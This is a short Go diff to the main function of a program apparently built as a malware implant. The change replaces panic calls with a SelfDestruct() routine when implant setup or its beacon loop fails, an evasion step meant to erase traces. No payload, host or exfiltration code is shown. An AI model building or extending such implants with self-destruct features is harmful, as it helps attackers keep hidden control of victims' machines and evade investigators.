@@ -21,10 +21,10 @@ func init() {
 func main() {
 	implant, err := NewImplant()
 	if err != nil {
-		panic(err)
+		SelfDestruct()
 	}
 	err = implant.BeaconLoop()
 	if err != nil {
-		panic(err)
+		SelfDestruct()
 	}
 }
